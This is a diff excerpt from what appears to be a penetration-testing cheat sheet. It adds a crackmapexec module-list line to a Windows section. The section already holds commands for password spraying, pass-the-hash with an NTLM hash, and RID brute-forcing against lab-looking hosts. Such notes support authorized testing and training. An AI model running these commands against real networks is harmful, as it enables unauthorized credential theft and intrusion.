@@ -646,6 +646,9 @@ john --wordlist=/usr/share/wordlists/fasttrack.txt --rules /usr/share/john/rules
 ## Windows
 ### crackmap
 ```bash
+# Module list
+crackmapexec ldap -L
+## Nomal
 crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success --local-auth --loggedon-users
 crackmapexec smb 192.168.226.189 192.168.226.191 192.168.226.248-249 -u user -H 54abdf854d8c0653b1be3458454e4a3b -d htb.local --continue-on-success
 crackmapexec smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
